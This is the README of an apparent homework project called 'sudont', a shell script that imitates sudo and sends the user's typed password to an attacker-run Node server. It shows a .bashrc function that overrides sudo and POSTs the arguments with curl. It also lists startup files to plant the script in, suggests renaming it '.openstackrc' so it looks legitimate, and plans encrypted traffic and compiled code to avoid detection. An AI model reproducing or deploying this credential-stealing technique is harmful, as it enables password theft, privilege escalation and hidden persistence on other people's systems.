# sudont

## My rant about sudo that you have to read since you're grading my homework 

I have a strong, strong hatred of sudo, and this project is the ultimate
expression of that hatred.

It is so ridiculously trivial to steal a user's password using sudo, assuming you already have
the ability to write to their home directory. 

```
.bashrc
----------
sudo() {
    curl -X POST ... $@
}
```

Look, I did it. I stole a user's password. It was that simple. Now I can run commands as sudo as much as I want.

I'm not one who's commonly known for praising Windows, but I believe that their method of escalating privileges through the Secure Desktop environment is the only safe way to handle privilege escalation.

## About this project

I attempted to write a script that replicates the functionality
of sudo as closely as possible, while passing the credentials on to a webserver that stores it
in a file.

The script is at the root of this project, named `sudont.sh`

This project also contains an express server written in Node for receiving information from the script. It looks a little scary, but everything important is in `controllers/credentials.js` so you can just read that file if you want to get the gist of its functionality. 

## Dependencies (for the server)

- Node (latest version)

## Usage

### Server

```
# Initial Setup (only run the first time)
npm i

# Execute this to start the server
npm run start
```

### Script

```
source ./sudont.sh
```

Places where you might want to slip this:

- ~/.bashrc
- ~/.bash_profile
- /etc/environment

Example:

```
~/.bashrc
----------
...

# OpenStack Defaults
source ~/.openstackrc
```

In this example, sudont.sh was renamed to .openstackrc to make it appear like a script that was added to the OpenStack image.

## Next Steps

Here's how I'd like to improve this project in the future

- Use HTTPS, so what's happening isn't obvious to anyone sniffing traffic
- Use mutual TLS (with pinned keys) so traffic cannot be intercepted
- Convert the script into a C++/Rust program, so it cannot be easily reverse engineered